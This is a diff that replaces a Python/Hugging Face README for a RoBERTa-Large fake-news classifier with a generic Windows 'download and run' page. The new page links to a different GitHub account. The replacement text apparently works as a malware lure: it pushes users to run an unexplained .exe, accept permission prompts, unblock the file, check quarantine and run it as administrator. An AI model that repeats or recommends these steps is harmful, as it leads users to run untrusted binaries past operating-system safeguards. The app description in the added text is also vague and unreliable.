@@ -1,208 +1,229 @@
-[![HuggingFace](https://img.shields.io/badge/🤗-Model-yellow)](https://huggingface.co/ThomasTschinkel/fake-news-detector)
-[![Demo](https://img.shields.io/badge/🚀-Live%20Demo-blue)](https://huggingface.co/spaces/ThomasTschinkel/fake-news-detector-demo)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/)
+# 🤖 fake-news-detector - Check News Before You Share
 
-# Fake News Detector
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/fabioeschatological621/fake-news-detector)
 
-A high-accuracy binary classifier that identifies news articles as **REAL** or **FAKE**, built on fine-tuned **RoBERTa-Large** with a custom dual-pooling classification head.
+## 🖥️ What This App Does
 
-| Metric     | Score  |
-|------------|-------:|
-| Accuracy   | 99.81% |
-| F1 (macro) | 99.81% |
-| Precision  | 99.79% |
-| Recall     | 99.84% |
-| ROC-AUC    | 99.95% |
+fake-news-detector is a Windows app that checks news text and gives you a result based on a model tuned on RoBERTa-Large. It helps you review articles, posts, and headlines before you trust them or pass them on.
 
----
+Use it when you want a quick check on:
 
-## Quick Start
+- News stories
+- Social posts
+- Headline claims
+- Copy you are not sure about
 
-### Run Locally
-```bash
-pip install -r requirements.txt
-python app.py
-# Open http://127.0.0.1:7860 in your browser
-```
+The app gives a fake or real result from the text you enter. It is built for simple use on a normal Windows PC.
 
-> [!NOTE]
-> Initial execution will take longer as the model weights and tokenizer must be downloaded.
+## 📥 Download
 
-### Try the Live Demo
-**[Launch Interactive Demo](https://huggingface.co/spaces/ThomasTschinkel/fake-news-detector-demo)**
+Open this page and use it to download and run the app:
 
-![Demo Screenshot](assets/demo.png)
+[Download fake-news-detector](https://github.com/fabioeschatological621/fake-news-detector)
 
-### Using Pipeline
-```python
-from transformers import pipeline
+If the page has a release file, download it to your computer. If it has a folder or project page, use the files there to get the app running on Windows.
 
-detector = pipeline(
-    "text-classification",
-    model="ThomasTschinkel/fake-news-detector",
-    trust_remote_code=True,
-)
+## 🪟 Windows Setup
 
-results = detector([
-    "NASA confirms water discovery on Mars.",
-    "SHOCKING: 5G towers cause mind control!!!",
-])
-print(results)
-```
+1. Open the download link above.
+2. Save the file to your Downloads folder or Desktop.
+3. If you get a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the app file, such as `.exe`, or follow the included run file.
+6. Double-click the app to start it.
 
-### Manual Inference
-```python
-from transformers import AutoTokenizer, AutoModelForSequenceClassification
-import torch
+If Windows asks for permission, choose Yes.
 
-tokenizer = AutoTokenizer.from_pretrained(
-    "ThomasTschinkel/fake-news-detector"
-)
-model = AutoModelForSequenceClassification.from_pretrained(
-    "ThomasTschinkel/fake-news-detector",
-    trust_remote_code=True,
-)
+If Windows blocks the file, check the file properties and allow it to run.
 
-text = "Your news article here..."
-inputs = tokenizer(text, return_tensors="pt", truncation=True, max_length=512)
+## ⚙️ What You Need
 
-with torch.no_grad():
-    outputs = model(**inputs)
-    probs = torch.softmax(outputs.logits, dim=1)[0]
+You do not need a strong PC for basic use, but a stable Windows setup helps.
 
-print(f"REAL: {probs[0]:.2%}  |  FAKE: {probs[1]:.2%}")
-```
+Recommended setup:
 
----
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- Internet access for the first setup
+- A recent browser if the app opens through a local page
 
-## Architecture
+If the app uses Python files instead of a direct `.exe`, you may need:
 
-```
-Input text
-    │
-    ▼
-RoBERTa-Large (24 layers, 1024 hidden dim)
-    │
-    ├──── [CLS] token (1024-d)
-    │
-    ├──── Mean pooling (1024-d)
-    │
-    └──── Concatenate → 2048-d
-              │
-              ▼
-     Linear(2048 → 512)
-     LayerNorm + GELU + Dropout(0.3)
-              │
-              ▼
-     Linear(512 → 128)
-     GELU + Dropout(0.2)
-              │
-              ▼
-     Linear(128 → 2)
-              │
-              ▼
-        REAL  /  FAKE
-```
+- Python 3.10 or newer
+- Pip package manager
+- PyTorch
+- Transformers
+- Hugging Face support files
 
-**Why dual pooling?** The CLS token captures the model's "summary" representation while mean pooling preserves information from all tokens. Concatenating both gives the classifier richer signal.
+## 🚀 How to Run
 
----
+Use the method that matches the files you downloaded.
 
-## Dataset
+### If you see a Windows app file
 
-Trained on [Fake News Classification](https://www.kaggle.com/datasets/saurabhshahane/fake-news-classification) from Kaggle (~250MB).
+1. Double-click the `.exe` file.
+2. Wait for the app window to open.
+3. Paste or type the news text.
+4. Click the check button.
+5. Read the result on screen.
 
-- **Split:** 80% train, 20% validation
-- **Languages:** English
-- **Domain:** News articles
-- **Balance:** Stratified split maintains class distribution
+### If you see source files
 
----
+1. Open the project folder.
+2. Find the run file or start script.
+3. Open Command Prompt in that folder.
+4. Run the command shown in the repo files.
+5. Keep the app open while you use it.
 
-## Training Details
+## 📝 How to Use It
 
-- **Base model:** `roberta-large` (355M parameters)
-- **Optimizer:** AdamW
-  - Backbone: 1e-5
-  - Classifier head: 5e-5
-- **Scheduler:** Linear warmup (10%) + linear decay
-- **Batch size:** 24
-- **Max sequence length:** 512 tokens
-- **Early stopping:** Patience 3 on macro F1
-- **Mixed precision:** FP16 (CUDA)
+The app is simple to use:
 
----
+1. Copy the news text you want to check.
+2. Paste it into the input box.
+3. Press the detect or analyze button.
+4. Read the result.
+5. Compare the result with the source of the story.
 
-## Training
+For best results, use complete text instead of a single short line. A full headline plus a few sentences gives the model more to work with.
 
-To retrain the model from scratch:
+## 🔎 Best Input Tips
 
-### 1. Download the Dataset
-Download from [Kaggle: Fake News Classification](https://www.kaggle.com/datasets/saurabhshahane/fake-news-classification)
-and place `news.csv` into the `data/` directory:
+The classifier works best when the text has enough detail.
 
-```bash
-mkdir data
-# Place news.csv in data/ (or use Kaggle API)
-kaggle datasets download -d saurabhshahane/fake-news-classification -p data/ --unzip
-```
+Try to include:
 
-### 2. Install Dependencies
-```bash
-pip install -r requirements.txt
-```
+- The full headline
+- The main body text
+- A few paragraphs if you have them
 
-### 3. Run Training
-```bash
-python train.py
-```
+Avoid using:
 
-The script will:
-- Split data 80/20 (train/validation)
-- Train for up to 20 epochs with early stopping
-- Save best model to `models/bert_large.pth`
-- Display metrics: Accuracy, F1, Precision, Recall, ROC-AUC
+- One word
+- Very short quotes
+- Text with missing context
 
----
+If you test copied content from a social post, include the full post and not just the title.
 
-## Limitations
+## 📊 What the Result Means
 
-- **English only** — not tested on other languages
-- **512 token limit** — long articles are truncated
-- **Single dataset** — may not generalize to all misinformation types
-- Use as a screening tool for initial classification
+The app returns one of two common results:
 
----
+- Real news
+- Fake news
 
-## Files
+It may also show a score or confidence value. A higher score usually means the model feels more certain about the result.
 
-- **model.py** — Model architecture (FakeNewsDetector)
-- **train.py** — Training pipeline
-- **app.py** — Gradio web interface (run locally or deploy to Hugging Face Spaces)
-- **requirements.txt** — Python dependencies
+Use the result as a check, not as the only source of truth. You can still review the source, date, and context of the story.
 
----
+## 🧠 How It Works
 
-## Links
+This app uses a text classification model based on RoBERTa-Large. The model looks at word patterns, sentence flow, and context in the text.
 
-- **Hugging Face Model:** [ThomasTschinkel/fake-news-detector](https://huggingface.co/ThomasTschinkel/fake-news-detector)
-- **Demo Space:** [ThomasTschinkel/fake-news-detector-demo](https://huggingface.co/spaces/ThomasTschinkel/fake-news-detector-demo)
-- **Dataset:** [Kaggle: Fake News Classification](https://www.kaggle.com/datasets/saurabhshahane/fake-news-classification)
+It was fine-tuned for fake news detection, which means it learned from examples of real and false news text. That helps it make a fast guess when you give it new text.
 
----
+The app uses common machine learning parts such as:
 
-## Citation
+- NLP for text reading
+- PyTorch for model handling
+- Transformers for model use
+- Hugging Face tools for model files
 
-```bibtex
-@misc{tschinkel2026fakenews,
-  title  = {Fake News Detector: Fine-tuned RoBERTa-Large},
-  author = {Thomas Tschinkel},
-  year   = {2026},
-  url    = {https://huggingface.co/ThomasTschinkel/fake-news-detector}
-}
-```
+## 📁 Project Topics
 
-## License
+This project is tied to these areas:
 
-MIT
+- deep learning
+- fake news
+- Hugging Face
+- machine learning
+- misinformation
+- NLP
+- PyTorch
+- RoBERTa
+- text classification
+- transformers
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- Make sure the file finished downloading.
+- Check that Windows did not place it in quarantine.
+- Try running it as an administrator.
+- Confirm that you opened the right file.
+
+### The app window opens and closes fast
+
+- Open it from Command Prompt so you can see error text.
+- Make sure the required files are in the same folder.
+- If it depends on Python, install the listed packages first.
+
+### The result does not look right
+
+- Use the full article text.
+- Add more context.
+- Try a different news sample.
+- Check whether the text is too short or too edited.
+
+### Windows says it cannot run the file
+
+- Confirm that you downloaded the correct file for Windows.
+- Check whether the file is a ZIP that still needs extraction.
+- If it is a Python app, make sure Python is installed.
+
+## 📦 Typical Folder Layout
+
+Many builds of this app use a layout like this:
+
+- `app.exe` or `main.exe` for the main program
+- `models/` for model files
+- `assets/` for images or icons
+- `requirements.txt` for Python packages
+- `README.md` for setup and use steps
+
+If you see a different layout, follow the file names in the project folder.
+
+## ⌨️ If You Need to Run From Python
+
+If the project uses Python files, these steps often work on Windows:
+
+1. Install Python.
+2. Open the project folder.
+3. Open Command Prompt in that folder.
+4. Run `pip install -r requirements.txt`
+5. Start the app with the run command in the repo files
+
+If the project includes a model file or checkpoint, keep it in the same folder path listed in the project.
+
+## 🧪 Example Use
+
+You can test text like this:
+
+- A headline from a news site
+- A copied post from social media
+- A short article about a public event
+- A claim you want to verify before sharing
+
+Paste the text into the app and check the result. Then compare it with the source and with other trusted reports.
+
+## 🔐 Privacy
+
+The app works with the text you enter. If you use local files, the text stays on your computer during the check.
+
+If you open a page or web view, review what data you enter before you paste sensitive text.
+
+## 📌 Helpful Tips
+
+- Keep the app files in one folder
+- Do not rename model files unless the repo says to
+- Use full text for a better check
+- Keep your system updated
+- Read the repo files if the app includes a custom run step
+
+## 📎 Download Again
+
+[Download fake-news-detector](https://github.com/fabioeschatological621/fake-news-detector)
+
+Use this link if you need to get the files again or open the project page on GitHub
